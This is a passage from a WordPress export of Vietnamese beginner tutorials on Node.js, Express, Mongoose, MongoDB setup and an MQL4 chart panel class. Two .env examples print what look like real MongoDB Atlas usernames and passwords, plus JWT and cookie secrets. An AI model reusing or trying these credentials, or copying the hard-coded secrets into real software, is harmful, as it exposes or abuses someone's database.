		<wp:post_modified_gmt><![CDATA[2020-12-31 18:00:34]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[js-module-1-phan-loai-module-trong-javascript]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="javascript"><![CDATA[Javascript]]></category>
						</item>
					<item>
		<title><![CDATA[NodeJS - 2. Các thư viện cơ bản]]></title>
		<link>https://duycode.com/2021/05/02/nodejs-2-cac-thu-vien-co-ban/</link>
		<pubDate>Sat, 01 May 2021 17:00:57 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=648</guid>
		<description></description>
		<content:encoded><![CDATA[<h1>I. Thư viện cơ bản</h1>
-- Cài đặt thư viện:
Thay <strong><em>name_library</em></strong> bằng tên thư viện
<blockquote>
npm install <em>name_library</em>
npm install <em>name_library</em> --save-dev
</blockquote>
- express
- mongodb
- mongoose
- ejs
- jsonwebtoken

<h1>II. Thư viện DEV</h1>
<h2>1. nodemon</h2>
-- Cài đặt: Tại ./package.json
<pre>
  "scripts": {
    "start": "node src/server.js",
    "dev": "nodemon --inspect -w . -w .env src/server.js",
    "scss":"node-sass --watch src/resources/scss/style.scss src/public/css/style.css",
    "test": "echo \"Error: no test specified\" && exit 1"
  },
</pre>
-- Sử dụng: Dùng Terminal
<blockquote>
npm run dev
</blockquote>

<h1>III. Khác</h1>
- lowdb
- mysql
- ngrok : đưa localhost lên online
- morgan : hiện thông tin địa chỉ request

<h1>IV. Ít dùng</h1>

<h2>2. node-sass</h2>
-- Thư viện DEV
-- Cài đặt: Tại ./package.json
<pre>
  "scripts": {
    "start": "node src/server.js",
    "dev": "nodemon --inspect -w . -w .env src/server.js",
    "scss":"node-sass --watch src/resources/scss/style.scss src/public/css/style.css",
    "test": "echo \"Error: no test specified\" && exit 1"
  },
</pre>
-- Sử dụng: Dùng Terminal
<blockquote>npm run scss</blockquote>

<h2>3. dotenv</h2>
-- Thư viện DEV
-- Tạo file ".env" (không có tên file) tại thư mục gốc: ./.env
<pre>
MONGO_DB=mongodb+srv://admin:nvdk30b@cluster0.bgpn9.mongodb.net/medihome?retryWrites=true&w=majority
MONGO_LOCALHOST=mongodb://localhost:27017/medihome

SECRET_SIGNEDCOOKIES=@123%456
SECRET_JWT=$DWDw123
</pre>
-- Sử dụng: Tại ./src/server.js
<pre>
if (!process.env.PORT) require('dotenv').config();
</pre>
-- Sử dụng: Gọi các biến của .env
<pre>
const port = process.env.PORT || 3000;
const uri = process.env.MONGO_DB || process.env.MONGO_LOCALHOST;
</pre>

<h2>***. Sử dụng .gitignore</h2>
-- Tạo file ".gitignore" (không có tên file) tại thư mục gốc: ./.gitignore
<pre>
.env
.gitignore
node_modules
</pre>




]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>648</wp:post_id>
		<wp:post_date><![CDATA[2021-05-02 00:00:57]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-05-01 17:00:57]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-05-02 00:00:57]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-05-01 17:00:57]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[nodejs-2-cac-thu-vien-co-ban]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="nodejs"><![CDATA[NodeJS]]></category>
						</item>
					<item>
		<title><![CDATA[NodeJS – 5. MVC: Models & Controllers]]></title>
		<link>https://duycode.com/2021/02/25/nodejs-5-mvc-models-controllers/</link>
		<pubDate>Thu, 25 Feb 2021 13:30:16 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=719</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Models</h2>
-- Tạo file: ./src/app/models/TuThuoc.js
-- Cần cài đặt và import thư viện mongoose trước
<pre>
const mongoose = require('mongoose');
const Schema = mongoose.Schema;

const TuThuocSchema = new Schema({
    TenThuoc: String,
    ThanhPhan: String,
    NhomThuoc: String,
    PhanLoai: {
        DangThuoc: String,  //Viên,Ống,Gói,Lọ,Chai
        DuongDung: String,
        DongHop: Number,
    },
    NguonGoc: {
        NuocSanXuat: String,
        NhaCungCap: Array,
    },
    SoLuong: [{
        SoHop: Number,
        SoLe: Number,
        GiaMua: Number,
        GiaBan: Number,
        HanSuDung: Number,
    }],
    createdAt: Number,
    updatedAt: Number,
    removedAt: Number,
},
    {
        timestamps: false,
        versionKey: false,
    }
);

module.exports = mongoose.model('TuThuoc', TuThuocSchema);
</pre>

<h2>2. Controllers</h2>
**** Ở Controller có sử dụng rất nhiều Middleware để lấy dữ liệu. Cần lưu ý :sử dụng -body-parser để parser dữ liệu gửi lên từ Client:
-- Tại file ./src/server.js
<pre>
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
</pre>

-- Sau khi có model, -body-parser, ta tạo Controllers
-- Tạo file .src/app/controllers/collections/TuThuocController
<pre>
const Collection = require('../../models/TuThuoc');

class CollectionController {
    //--[GET]--       /list                                 -- Get List --
    list(req, res, next) {
        Collection.find({ removedAt: 0 })
            .then(results => {
                res.json({ data: results })
            })
            .catch(err => next())
    }

    //--[GET]--       /trash-list                          -- Get List Trash --
    trashList(req, res, next) {
        Collection.find({ removedAt: { $ne: 0 } })
            .then(results => res.json({ data: results }))
            .catch(err => next())
    }

    //--[GET]--       /:id                                 -- Get One  By ID--
    findOne(req, res, next) {
        Collection.findById(req.params.id)
            .then((results) => res.json(results))
            .catch(next);
    }
    //--[POST]--      /add                                 -- Add  --
    store(req, res, next) {
        Object.assign(req.body, {
            createdAt: Date.now(),
            updatedAt: Date.now(),
            removedAt: 0,
        })
        const newData = new Collection(req.body);
        newData.save()
            .then((results) => res.json(results))
            .catch(next);
    }
    //--[PUT]--       /:id                                -- Update By ID --
    update(req, res, next) {
        Object.assign(req.body, {
            updatedAt: Date.now(),
        })
        Collection.findByIdAndUpdate(req.params.id, req.body, { new: true })
            .then((results) => res.json(results))
            .catch(next);
    }
    // --[PATCH]--    /remove/:id                         -- Remove By ID --
    remove(req, res, next) {
        Collection.findByIdAndUpdate(req.params.id, { removedAt: Date.now() }, { new: true })
            .then((results) => res.json(results))
            .catch(next)
    }
    //--[PATCH]--     /restore/:id                        -- Restore By ID --
    restore(req, res, next) {
        Collection.findByIdAndUpdate(req.params.id, { removedAt: 0 }, { new: true })
            .then((results) => res.json(results))
            .catch(next)
    }
    //--[DELETE]--    /destroy/:id                        -- Destroy By ID --
    destroy(req, res, next) {
        Collection.deleteOne({ _id: req.params.id })
            .then((results) => res.json(results))
            .catch(next);
    }
    // --[PATCH]--    /remove/:id                         -- Remove By ID --
    removeList(req, res, next) {
        Collection.updateMany({ _id: { $in: req.body.ids } }, { removedAt: Date.now() })
            .then((results) => res.json(results))
            .catch(next)
    }
    // --[PATCH]--    /restore/:id                        -- Restore List By ID --
    restoreList(req, res, next) {
        Collection.updateMany({ _id: { $in: req.body.ids } }, { removedAt: 0 })
            .then((results) => res.json(results))
            .catch(next)
    }
    // --[PATCH]--    /destroy/:id                         -- Destroy List By ID --
    destroyList(req, res, next) {
        Collection.deleteMany({ _id: { $in: req.body.ids } })
            .then((results) => res.json(results))
            .catch(next)
    }
}

module.exports = new CollectionController();
</pre>


]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>719</wp:post_id>
		<wp:post_date><![CDATA[2021-02-25 20:30:16]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-02-25 13:30:16]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-02-25 20:30:16]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-02-25 13:30:16]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[nodejs-5-mvc-models-controllers]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="nodejs"><![CDATA[NodeJS]]></category>
						</item>
					<item>
		<title><![CDATA[NodeJS - 1. Cài đặt NodeJS ExpressJS]]></title>
		<link>https://duycode.com/2021/05/01/nodejs-1-cai-dat-nodejs-expressjs/</link>
		<pubDate>Fri, 30 Apr 2021 17:00:01 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=893</guid>
		<description></description>
		<content:encoded><![CDATA[<h1>I. Cài đặt Project</h1>
<h2>1. Cài NodeJS và npm</h2>
- Download và cài đặt: <a href="https://nodejs.org/en/download/" rel="noopener" target="_blank">https://nodejs.org/en/download/</a>
- Kiểm tra version bằng terminal của VSCode
<blockquote>
node -v
npm -v
</blockquote>
<h2>2. Tạo Project</h2>
- Tạo thư mục: VD: D:\Projects\medihome
- Dùng VSCode mở thư mục project lên, và cài npm
<blockquote>
npm init
</blockquote>
- Cài thư viện Express
<blockquote>
npm install express
</blockquote>

<h1>II. Hello wold</h1>
<h2>1. Tạo file ./src/server.js</h1>
<pre>
const express = require('express');
const app = express();
const port = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send('Hello World!');
})
app.listen(port, () => {
  console.log(`Example app listening at http://localhost:` + port);
})
</pre>
<h2>2. Sửa file ./package.json</h2>
<pre>
  "main": "src/server.js",
</pre>
<h2>3. Khởi chạy</h2>
- Dùng terminal:
<blockquote>
node src/server.js
</blockquote>
- Dùng trình duyệt vào link: <a href="http://localhost:3000/" rel="noopener" target="_blank">http://localhost:3000/</a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>893</wp:post_id>
		<wp:post_date><![CDATA[2021-05-01 00:00:01]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-04-30 17:00:01]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-05-01 00:00:01]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-04-30 17:00:01]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[nodejs-1-cai-dat-nodejs-expressjs]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="nodejs"><![CDATA[NodeJS]]></category>
						</item>
					<item>
		<title><![CDATA[NodeJS - 3. Cây thư mục mẫu và các file cấu hình]]></title>
		<link>https://duycode.com/2021/05/03/nodejs-3-cay-thu-muc-mau-va-cac-file-cau-hinh/</link>
		<pubDate>Sun, 02 May 2021 17:00:58 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=903</guid>
		<description></description>
		<content:encoded><![CDATA[<h1>1. Cây thư mục mẫu của NodeJS</h1>
<pre>.
├── node_modules
├── src
│    ├── app
│    │    ├── controllers
│    │    │    ├── AdminController.js
│    │    │    └── CourseController.js
│    │    ├── middlewares
│    │    │    └── SortMiddleware.js
│    │    └── models
│    │         └── Course.js
│    ├── config
│    │    └── database
│    │    │    ├── mongoDB.js
│    │    │    └── mongoose.js
│    ├── public
│    │    ├── css
│    │    │    └── app.css
│    │    ├── img
│    │    │    └── logo.png
│    │    └── vendor
│    │         ├── open-iconic-master
│    │         │    └── font
│    │         │         └── css
│    │         │              └── open-iconic-bootstrap.css
│    │         └── fontawesome
│    │               └── css
│    ├── resources
│    │    ├── fonts
│    │    ├── images
│    │    ├── scss
│    │    │    ├── _variables.scss
│    │    │    └── app.scss
│    │    └── views
│    │         ├── courses
│    │         │     ├── courseHome.hbs
│    │         │     ├── create.hbs
│    │         │     └── showOne.hbs
│    │         ├── layouts
│    │         │     └── main.hbs
│    │         ├── partials
│    │         │     ├── header.hbs
│    │         │     └── footer.hbs
│    │         ├── home.hbs
│    │         └── news.hbs
│    ├── routes
│    │    ├── admin
│    │    │    └── index.js
│    │    ├── courses
│    │    └── index.js
│    ├── util
│    │    └── mongoose.js
│    └── server.js
├── .env
├── .gitignore
├── package-lock.json
├── package.json
└── Procfile
</pre>

<h1>II. Các file cấu hình</h1>
<h2>1. File .env (không có tên file)</h2>
- File này chỉ cấu hình trên máy
<pre>
MONGODB_URI=mongodb+srv://root:abcD1234@cluster0-wuil3.mongodb.net/test?retryWrites=true
MONGO_LOCALHOST=mongodb://localhost:27017/medihome
MONGODB_DB_NAME=medihome

SECRET_SIGNEDCOOKIES=@123%456
SECRET_JWT=$DWDw123
</pre>

<h2>2. File Procfile (không có tên mở rộng)</h2>
- File này cấu hình chạy trên server, giả sử heroku
- Khi không có file này, heroku tự chạy lệnh: "npm start"
<pre>
web: node src/server.js
</pre>

<h2>3. File .gitignore (không có tên file)</h2>
<pre>
.gitignore
.env
node_modules
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>903</wp:post_id>
		<wp:post_date><![CDATA[2021-05-03 00:00:58]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-05-02 17:00:58]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-05-03 00:00:58]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-05-02 17:00:58]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[nodejs-3-cay-thu-muc-mau-va-cac-file-cau-hinh]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="nodejs"><![CDATA[NodeJS]]></category>
						</item>
					<item>
		<title><![CDATA[MongoDB - 1. Cài đặt trên Window]]></title>
		<link>https://duycode.com/2021/03/09/mongodb-1-cai-dat-tren-window/</link>
		<pubDate>Tue, 09 Mar 2021 10:53:04 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=957</guid>
		<description></description>
		<content:encoded><![CDATA[Trang chủ: <a href="https://www.mongodb.com/" rel="noopener" target="_blank">https://www.mongodb.com/</a>

1. Installer
-- Tìm tại Docs, cài đặt: MongoDB Community Edition
-- Sau khi cài đặt xong, thư mục cài đặt mặc định là: C:\Program Files\MongoDB\Server\4.4\bin

2. Bật CMD để chạy mongod
-- cd về thư mục mongod:
<blockquote> cd C:\Program Files\MongoDB\Server\4.4\bin</blockquote>
-- Chạy câu lệnh đầu tiên: 
<blockquote>mongod</blockquote>
-- Sẽ xuất hiện lỗi thiếu thư mục: C:\data\db  -> Tạo thêm thư mục C:\data\db
-- Chạy lại câu lệnh mongod

2. Bật tiếp CMD thứ 2 lên test
-- Vẫn CD về thư mục mongoDB: C:\Program Files\MongoDB\Server\4.4\bin
-- Gõ lệnh: 
<blockquote>mongo</blockquote>
-- Sau khi xuất hiện version của MongoShell là đã thành công.
-- Tiếp tục show các database ra thì gõ tiếp
<blockquote>show dbs</blockquote>

3. Hiểu đơn giản:
-- Mỗi lần muốn chạy mongoDB, thì phải start 2 thứ trong thư mục: C:\Program Files\MongoDB\Server\4.4\bin
-- Đầu tiên, chạy file: mongod.exe
-- Sau đó, chạy tiếp file: mongo.exe
-- Các câu lệnh cần xử lý với databasse sẽ xử lý với CMD bật lên bởi mongo.exe

4. Muốn chạy mongoDB mà ko cần trỏ vào thư mục gốc của mongoDB
-- This Computer -> Properties -> Remote setting -> Advanced -> Environment Variables
-- Double click vào link "Path"
-- Thêm link: C:\Program Files\MongoDB\Server\4.4\bin
-- Xong
 
5. Một số câu lệnh hay dùng
show dbs -> show các database
use mydata -> truy vấn vào database: mydata ,
show collections -> show các collection trong database đang truy vấn
db.books.find() -> tìm các document trong collection books








]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>957</wp:post_id>
		<wp:post_date><![CDATA[2021-03-09 17:53:04]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-03-09 10:53:04]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-03-09 17:53:04]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-03-09 10:53:04]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[mongodb-1-cai-dat-tren-window]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="sql"><![CDATA[SQL]]></category>
						</item>
					<item>
		<title><![CDATA[Javascripts - npm - Những thư viện thường dùng]]></title>
		<link>https://duycode.com/2021/03/11/javascripts-npm-nhung-thu-vien-thuong-dung/</link>
		<pubDate>Wed, 10 Mar 2021 23:00:19 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=962</guid>
		<description></description>
		<content:encoded><![CDATA[1. casual -> random dữ liệu rất hay
2. puppeteer --> giả lập browser để cào dữ liệu]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>962</wp:post_id>
		<wp:post_date><![CDATA[2021-03-11 06:00:19]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-03-10 23:00:19]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-03-11 06:00:19]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-03-10 23:00:19]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[javascripts-npm-nhung-thu-vien-thuong-dung]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="javascript"><![CDATA[Javascript]]></category>
						</item>
					<item>
		<title><![CDATA[Các vấn đề về tối ưu tốc độ Website]]></title>
		<link>https://duycode.com/2021/03/11/cac-van-de-ve-toi-uu-toc-do-website/</link>
		<pubDate>Wed, 10 Mar 2021 23:02:34 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=964</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Chrome</h2>
1. Xem % code được sử dụng sau khi load
1 - Mở Chrome Dev Tool; 

2 - Nhấn Cmd + Shift + P hoặc Ctrl + Shift + P; 

3 - Nhập Phạm vi (Coverage) và chọn tùy chọn đầu tiên xuất hiện; 
4 - Nhấp vào nút load trên console để xem việc sử dụng code của toàn bộ tài nguyên của ứng dụng; 

<h2>2. Npm</h2>
source-map-explorer
<blockquote>npm i source-map-explorer</blockquote>
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>964</wp:post_id>
		<wp:post_date><![CDATA[2021-03-11 06:02:34]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-03-10 23:02:34]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-08-07 00:30:28]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-08-07 00:30:28]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[cac-van-de-ve-toi-uu-toc-do-website]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="mang-may-tinh"><![CDATA[Mạng Máy Tính]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[MQL - Những Class hay nhất]]></title>
		<link>https://duycode.com/2021/04/07/mql-nhung-class-hay-nhat/</link>
		<pubDate>Tue, 06 Apr 2021 18:45:16 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=969</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Class MT4Panel</h2>
<pre>
//+------------------------------------------------------------------+
#property copyright "Copyright 2021, MetaQuotes Software Corp."
#property link      "https://www.mql5.com"
#property strict

//+------------------------------------------------------------------+
bool CreateButton(string name) {
    ResetLastError();
    if(!ObjectCreate(0, name, OBJ_BUTTON, 0, 0, 0)) {
        Print(__FUNCTION__, "! Error code = ", GetLastError());
        return(false);
    }
    ObjectSetInteger(0, name, OBJPROP_XDISTANCE, 100);
    ObjectSetInteger(0, name, OBJPROP_YDISTANCE, 100);
    ObjectSetInteger(0, name, OBJPROP_XSIZE, 50);
    ObjectSetInteger(0, name, OBJPROP_YSIZE, 20);
    ObjectSetInteger(0, name, OBJPROP_CORNER, CORNER_LEFT_UPPER);
    ObjectSetString(0, name, OBJPROP_TEXT, "Button");
    ObjectSetString(0, name, OBJPROP_FONT, "Arial");
    ObjectSetInteger(0, name, OBJPROP_FONTSIZE, 10);
    ObjectSetInteger(0, name, OBJPROP_COLOR, clrBlack);
    ObjectSetInteger(0, name, OBJPROP_BGCOLOR, C'236,233,216');
    ObjectSetInteger(0, name, OBJPROP_BORDER_COLOR, clrNONE);
    ObjectSetInteger(0, name, OBJPROP_BACK, false);
    ObjectSetInteger(0, name, OBJPROP_STATE, false);
    ObjectSetInteger(0, name, OBJPROP_SELECTABLE, false);
    ObjectSetInteger(0, name, OBJPROP_SELECTED, false);
    ObjectSetInteger(0, name, OBJPROP_HIDDEN, true);
    ObjectSetInteger(0, name, OBJPROP_ZORDER, 0);
    return(true);
}

//+------------------------------------------------------------------+
bool CreateEdit(string name) {
    ResetLastError();
    if(!ObjectCreate(0, name, OBJ_EDIT, 0, 0, 0)) {
        Print(__FUNCTION__, "! Error code = ", GetLastError());
        return(false);
    }
    ObjectSetInteger(0, name, OBJPROP_XDISTANCE, 100);
    ObjectSetInteger(0, name, OBJPROP_YDISTANCE, 100);
    ObjectSetInteger(0, name, OBJPROP_XSIZE, 100);
    ObjectSetInteger(0, name, OBJPROP_YSIZE, 20);
    ObjectSetString(0, name, OBJPROP_TEXT, "");
    ObjectSetString(0, name, OBJPROP_FONT, "Arial");
    ObjectSetInteger(0, name, OBJPROP_FONTSIZE, 10);
    ObjectSetInteger(0, name, OBJPROP_ALIGN, ALIGN_CENTER);
    ObjectSetInteger(0, name, OBJPROP_READONLY, true);
    ObjectSetInteger(0, name, OBJPROP_CORNER, CORNER_LEFT_UPPER);
    ObjectSetInteger(0, name, OBJPROP_COLOR, clrBlack);
    ObjectSetInteger(0, name, OBJPROP_BGCOLOR, clrWhite);
    ObjectSetInteger(0, name, OBJPROP_BORDER_COLOR, clrDimGray);
    ObjectSetInteger(0, name, OBJPROP_BACK, false);
    ObjectSetInteger(0, name, OBJPROP_SELECTABLE, false);
    ObjectSetInteger(0, name, OBJPROP_SELECTED, false);
    ObjectSetInteger(0, name, OBJPROP_HIDDEN, true);
    ObjectSetInteger(0, name, OBJPROP_ZORDER, 0);
    return(true);
}

//+------------------------------------------------------------------+
void ObjectSetXY(string name, int x, int y) {
    ObjectSet(name, OBJPROP_XDISTANCE, x);
    ObjectSet(name, OBJPROP_YDISTANCE, y);
}

//+------------------------------------------------------------------+
void ObjectSetSize(string name, int width, int height) {
    ObjectSet(name, OBJPROP_XSIZE, width);
    ObjectSet(name, OBJPROP_YSIZE, height);
}

//+------------------------------------------------------------------+
class MT4Panel {
  public:
    string      itemsOld[];
    string      background, title, btnClose, btnMinus;
    struct      Item {
        string  name;
        int     x0;
        int     y0;
    };
    Item        items[];
    int         x, y, width, height, titHeight;
    bool        MouseDown,
                MouseOnTitle;
    double      x0Mouse,
                y0Mouse;

    MT4Panel() {
        this.x              = 200;
        this.y              = 100;
        this.width          = 400;
        this.height         = 100;
        this.titHeight      = 20;

        this.MouseDown      = false;
        this.MouseOnTitle   = false;
        this.x0Mouse     = 0;
        this.y0Mouse     = 0;

        static int MyObject_ID = 0;
        this.background = "MT4Panel-background" + MyObject_ID;
        this.title = "MT4Panel-title" + MyObject_ID;
        this.btnClose = "MT4Panel-btnClose" + MyObject_ID;
        this.btnMinus = "MT4Panel-btnMinus" + MyObject_ID;
        MyObject_ID++;
        this.createModal();

        ChartSetInteger(0, CHART_EVENT_MOUSE_MOVE, 1);
    }

    void createModal() {
        CreateEdit(this.background);
        ObjectSetInteger(0, this.background, OBJPROP_BGCOLOR, clrLavender);

        CreateEdit(this.title);
        ObjectSetInteger(0, this.title, OBJPROP_BGCOLOR, clrWhite);
        ObjectSetInteger(0, this.title, OBJPROP_FONTSIZE, 12);
        ObjectSetText(this.title, "Dashboard MT4-Panel");

        CreateButton(this.btnClose);
        ObjectSetInteger(0, this.btnClose, OBJPROP_BGCOLOR, clrWhite);
        ObjectSetInteger(0, this.btnClose, OBJPROP_FONTSIZE, 12);
        ObjectSetText(this.btnClose, "x");

        CreateButton(this.btnMinus);
        ObjectSetInteger(0, this.btnMinus, OBJPROP_BGCOLOR, clrWhite);
        ObjectSetInteger(0, this.btnMinus, OBJPROP_FONTSIZE, 12);
        ObjectSetText(this.btnMinus, "-");

        this.addItem(this.background, 0, 0);
        this.addItem(this.title, 0, 0);
        this.addItem(this.btnClose, this.width - this.titHeight, 0);
        this.addItem(this.btnMinus, this.width - this.titHeight * 2, 0);

        this.drawSize();
    }

    void drawSize() {
        ObjectSetSize(this.background, this.width, this.height);
        ObjectSetSize(this.title, this.width - this.titHeight * 2, this.titHeight);
        ObjectSetSize(this.btnClose, this.titHeight, this.titHeight);
        ObjectSetSize(this.btnMinus, this.titHeight, this.titHeight);
    }

    void drawPosition() {
        setItemPosition(this.btnClose, this.width - this.titHeight, 0);
        setItemPosition(this.btnMinus, this.width - this.titHeight * 2, 0);
    }

    void setSize(int width, int height) {
        this.width = width;
        this.height = height;
        drawSize();
        drawPosition();
    }

    void setTitleHeight(int titHeight) {
        this.titHeight = titHeight;
        drawSize();
        drawPosition();
    }

    void addItem(string name, int x0, int y0) {
        int s = ArraySize(this.items);
        ArrayResize(this.items, s + 1, 10);
        this.items[s].name = name;
        this.setItemPosition(s, x0, y0);
    }

    void setItemPosition(int i, int x0, int y0) {
        this.items[i].x0 = x0;
        this.items[i].y0 = y0;
        ObjectSetXY(this.items[i].name, this.x + x0, this.y + y0);
    }

    void setItemPosition(string name, int x0, int y0) {
        int s = ArraySize(this.items);
        int n = -1;
        for(int i = 0; i < s; i++) {
            if(this.items[i].name == name) {
                n = i;
                break;
            }
        }
        if(n > -1) setItemPosition(n, x0, y0);
    }

    void setPosition(int x, int y) {
        this.x = x;
        this.y = y;
        int s = ArraySize(this.items);
        for(int i = 0; i < s; i++) {
            string n = this.items[i].name;
            int xN = this.x + this.items[i].x0;
            int yN = this.y + this.items[i].y0;
            ObjectSetXY(n, xN, yN);
        }
    }

    void showOnTop() {
        bool state = ObjectGet(this.btnMinus, OBJPROP_STATE);
        int s = ArraySize(this.items);
        for(int i = 0; i < s; i++) {
            ObjectSetInteger(0, this.items[i].name, OBJPROP_TIMEFRAMES, EMPTY);
            if(!state) {
                ObjectSetInteger(0, this.items[i].name, OBJPROP_TIMEFRAMES, OBJ_ALL_PERIODS);
            } else if(state && 0 < i && i <= 3) {
                ObjectSetInteger(0, this.items[i].name, OBJPROP_TIMEFRAMES, OBJ_ALL_PERIODS);
            }
        }
    }

    void deletePanel() {
        int s = ArraySize(this.items);
        for(int i = 0; i < s; i++) {
            ObjectDelete(0, this.items[i].name);
        }
    }

    void onEventPanel(int id, long lparam, double dparam, string sparam) {
        if(id == CHARTEVENT_MOUSE_MOVE) {
